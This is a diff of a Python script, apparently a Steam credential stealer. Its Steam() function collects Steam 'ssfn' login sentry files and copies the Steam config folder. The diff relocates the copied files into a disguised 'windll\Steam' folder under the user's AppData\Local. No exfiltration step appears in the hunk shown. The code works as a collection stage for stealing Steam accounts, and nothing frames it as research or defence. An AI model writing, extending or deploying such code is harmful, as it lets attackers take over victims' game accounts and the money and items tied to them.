@@ -19,11 +19,11 @@ path02 = r'C:\Program Files\Steam\config'
 path3 = r'C:\Program Files (x86)\Steam'
 path03 = r'C:\Program Files (x86)\Steam\config'
 
-
-directory = r'C:\windll\Steam\\config'
-directory2 = r'C:\windll\Steam'
 def Steam():
     try:
+        pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        directory = rf'{pathtofile}\windll\Steam\config'
+        directory2 = rf'{pathtofile}\windll\Steam'
         files2 = [i for i in os.listdir(path2) if os.path.isfile(os.path.join(path2,i)) and \
          'ssfn' in i]
         shutil.copytree(path02, directory)
